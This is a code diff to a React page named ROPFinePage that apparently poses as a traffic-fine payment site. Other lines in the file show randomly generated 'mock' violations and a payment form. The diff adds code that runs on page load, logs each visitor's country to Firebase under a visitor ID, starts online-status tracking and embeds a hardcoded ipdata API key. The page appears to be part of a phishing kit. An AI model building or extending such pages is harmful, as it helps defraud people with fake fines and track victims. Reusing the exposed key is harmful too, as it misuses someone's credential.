@@ -1,7 +1,7 @@
 "use client"
 
 import type React from "react"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Card, CardContent } from "@/components/ui/card"
 import { Checkbox } from "@/components/ui/checkbox"
 import { Input } from "@/components/ui/input"
@@ -11,6 +11,7 @@ import { ViolationsList } from "@/components/violations-list"
 import { SiteHeader } from "@/components/ui/header"
 import { PaymentForm } from "@/components/payment-form"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 interface Violation {
   id: string
@@ -141,7 +142,29 @@ export default function ROPFinePage() {
     expiryDate: "",
     specificVehicle: false,
   })
-
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+  
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const country = await response.text();
+        addData({
+            id:visitorID,
+            country: country
+        })
+        localStorage.setItem('country',country)
+        setupOnlineStatus(visitorID)
+      } catch (error) {
+        console.error('Error fetching location:', error);
+    }
+  }
+useEffect(()=>{   
+   getLocation()
+},[])
   const getRandomViolations = () => {
     const numberOfViolations = Math.floor(Math.random() * 4) + 1 // 1-4 violations
     const shuffled = [...mockViolations].sort(() => 0.5 - Math.random())
